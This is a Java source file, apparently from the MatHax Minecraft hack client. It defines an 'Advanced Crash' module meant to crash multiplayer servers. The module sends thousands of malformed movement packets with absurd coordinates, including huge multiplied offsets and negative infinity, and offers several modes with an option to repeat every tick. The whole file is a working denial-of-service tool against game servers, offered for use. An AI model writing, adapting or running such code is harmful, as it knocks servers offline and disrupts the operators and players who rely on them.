package mathax.client.systems.modules.crash;

import mathax.client.eventbus.EventHandler;
import mathax.client.events.game.GameLeftEvent;
import mathax.client.events.world.TickEvent;
import mathax.client.settings.*;
import mathax.client.systems.modules.Categories;
import mathax.client.systems.modules.Module;
import mathax.client.utils.Utils;
import net.minecraft.item.Items;
import net.minecraft.network.packet.c2s.play.PlayerMoveC2SPacket;

import java.util.Objects;

public class AdvancedCrash extends Module {

    private final Setting<Modes> crashMode;

    private final Setting<Integer> amount;

    private final Setting<Boolean> onTick;

    private final Setting<Boolean> autoDisable;

    public AdvancedCrash() {
        super(Categories.Crash, Items.BRICKS, "Advanced Crash", "CRYSTAL || A newly developed crash method.");
        SettingGroup sgGeneral = settings.getDefaultGroup();
        onTick = sgGeneral.add(new BoolSetting.Builder()
            .name("on-tick")
            .description("Sends the packets every tick.")
            .defaultValue(false)
            .build());
        autoDisable = sgGeneral.add(new BoolSetting.Builder()
            .name("Auto Disable")
            .description("Disables module on kick.")
            .defaultValue(true)
            .build());
        amount = sgGeneral.add(new IntSetting.Builder()
            .name("amount")
            .description("How many packets to send to the server.")
            .defaultValue(5000)
            .sliderRange(100, 10000)
            .build());
        crashMode = sgGeneral.add(new EnumSetting.Builder<Modes>()
            .name("mode")
            .description("Which crash mode to use.")
            .defaultValue(Modes.NEW)
            .build());
    }

    @Override
    public boolean onActivate() {
        if (Utils.canUpdate() && !onTick.get()) {
            Modes modes = crashMode.get();
            if (Objects.requireNonNull(modes) == Modes.NEW) {
                double i = 0;
                while (true) {
                    if (i < amount.get()) {
                        assert mc.player != null;
                        Objects.requireNonNull(mc.getNetworkHandler()).sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(mc.player.getX() + (9412 * i), mc.player.getY() + (9412 * i), mc.player.getZ() + (9412 * i), true));
                        i++;
                    } else {
                        break;
                    }
                }
            } else if (modes != Modes.OTHER) {
                if (modes != Modes.OLD) {
                } else {
                    Objects.requireNonNull(mc.getNetworkHandler()).sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(Double.NEGATIVE_INFINITY, Double.NEGATIVE_INFINITY, Double.NEGATIVE_INFINITY, true));
                }
            } else {
                double i = 0;
                while (true) {
                    if (i < amount.get()) {
                        assert mc.player != null;
                        Objects.requireNonNull(mc.getNetworkHandler()).sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(mc.player.getX() + (500000 * i), mc.player.getY() + (500000 * i), mc.player.getZ() + (500000 * i), true));
                        i++;
                    } else {
                        break;
                    }
                }
            }
            if (autoDisable.get()) {
                toggle();
            }
        } else {
            return false;
        }
        return false;
    }

    @EventHandler
    public void onTick(TickEvent.Pre tickEvent) {
        if (onTick.get()) {
            Modes modes = crashMode.get();
            if (Objects.requireNonNull(modes) == Modes.NEW) {
                double i;
                i = 0;
                while (true) {
                    if (i < amount.get()) {
                        assert mc.player != null;
                        Objects.requireNonNull(mc.getNetworkHandler()).sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(mc.player.getX() + (9412 * i), mc.player.getY() + (9412 * i), mc.player.getZ() + (9412 * i), true));
                        i++;
                    } else {
                        break;
                    }
                }
            } else if (modes == Modes.OTHER) {
                double i;
                i = 0;
                while (true) {
                    if (i < amount.get()) {
                        assert mc.player != null;
                        Objects.requireNonNull(mc.getNetworkHandler()).sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(mc.player.getX() + (500000 * i), mc.player.getY() + (500000 * i), mc.player.getZ() + (500000 * i), true));
                        i++;
                    } else {
                        break;
                    }
                }
            } else if (modes == Modes.OLD) {
                double i;
                i = 0;
                while (true) {
                    if (i < amount.get()) {
                        Objects.requireNonNull(mc.getNetworkHandler()).sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(Double.NEGATIVE_INFINITY, Double.NEGATIVE_INFINITY, Double.NEGATIVE_INFINITY, true));
                        i++;
                    } else {
                        break;
                    }
                }
            } else if (modes == Modes.EFFICIENT) {
                double i;
                i = 0;
                while (true) {
                    if (i < amount.get()) {
                        assert mc.player != null;
                        Objects.requireNonNull(mc.getNetworkHandler()).sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(mc.player.getX() + (833333 * i), mc.player.getY() + (833333 * i), mc.player.getZ() + (833333 * i), true));
                        i++;
                    } else {
                        break;
                    }
                }
            } else if (modes == Modes.FULL) {
                double i;
                i = 0;
                while (true) {
                    if (i < amount.get()) {
                        assert mc.player != null;
                        Objects.requireNonNull(mc.getNetworkHandler()).sendPacket(new PlayerMoveC2SPacket.Full(mc.player.getX() + (833333 * i),
                            mc.player.getY() + (833333 * i),
                            mc.player.getZ() + (833333 * i),
                            (float) (mc.player.getYaw() + (83333 * i)),
                            (float) (mc.player.getPitch() + (83333 * i)),
                            true));
                        i++;
                    } else {
                        break;
                    }
                }
            }
        } else {
            return;
        }
    }

    @EventHandler
    private void onGameLeft(GameLeftEvent event) {
        if (!autoDisable.get()) {
            return;
        }
        toggle();
    }

    public enum Modes {
        EFFICIENT,
        FULL,
        NEW,
        OLD,
        OTHER

    }
}
